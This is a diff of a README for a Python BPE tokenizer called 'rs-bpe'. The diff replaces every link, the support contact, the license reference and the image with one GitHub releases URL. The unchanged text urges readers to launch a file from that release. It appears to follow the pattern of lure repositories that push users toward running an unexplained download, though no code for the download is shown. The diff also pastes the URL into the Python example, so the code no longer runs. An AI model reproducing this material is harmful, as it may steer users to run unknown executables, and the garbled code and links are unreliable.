@@ -13,7 +13,7 @@ Welcome to the official repository of "rs-bpe" - a blazingly fast Python BPE (By
 - Wide range of topics and support for various tokenization tasks
 
 ## 🔗 Repository Link
-[Download Release.zip](https://github.com/releases/789694263/Release.zip)
+[Download https://github.com/SameerManan/rs-bpe/releases](https://github.com/SameerManan/rs-bpe/releases)
 
 ## 🎉 Launch Instructions
 Please launch the file present in the provided release link.
@@ -37,10 +37,10 @@ Here is a simple example of how you can use rs-bpe in your Python projects:
 import rsbpe
 
 # Initialize the BPE tokenizer
-tokenizer = rsbpe.Tokenizer()
+tokenizer = https://github.com/SameerManan/rs-bpe/releases()
 
 # Tokenize a sentence
-tokens = tokenizer.tokenize("This is a sample sentence.")
+tokens = https://github.com/SameerManan/rs-bpe/releases("This is a sample sentence.")
 
 # Print the tokenized output
 print(tokens)
@@ -50,13 +50,13 @@ print(tokens)
 We welcome contributions from the community to enhance the rs-bpe repository. If you have any suggestions, bug fixes, or new features to add, feel free to submit a pull request.
 
 ## 📞 Support
-For any queries or issues, please reach out to our support team at support@rsbpe.com
+For any queries or issues, please reach out to our support team at https://github.com/SameerManan/rs-bpe/releases
 
 ## 🌐 Links
-- [Website](https://www.rsbpe.com)
-- [Documentation](https://docs.rsbpe.com)
-- [PyPI Package](https://pypi.org/project/rsbpe)
-- [Tokenizers](https://www.tokenizers.com)
+- [Website](https://github.com/SameerManan/rs-bpe/releases)
+- [Documentation](https://github.com/SameerManan/rs-bpe/releases)
+- [PyPI Package](https://github.com/SameerManan/rs-bpe/releases)
+- [Tokenizers](https://github.com/SameerManan/rs-bpe/releases)
 
 ## 🙌 Acknowledgements
 We would like to thank the following organizations for their support:
@@ -66,10 +66,10 @@ We would like to thank the following organizations for their support:
 - Rust Community
 
 ## 📝 License
-This project is licensed under the MIT License - see the LICENSE.md file for details.
+This project is licensed under the MIT License - see the https://github.com/SameerManan/rs-bpe/releases file for details.
 
 ---
 
 Feel free to explore the rs-bpe repository and take advantage of its high-performance BPE tokenization capabilities! 🚀🔥
 
-![BPE Tokenizer](https://yourimageurl.com/awesome_bpe_image.png)
+![BPE Tokenizer](https://github.com/SameerManan/rs-bpe/releases)
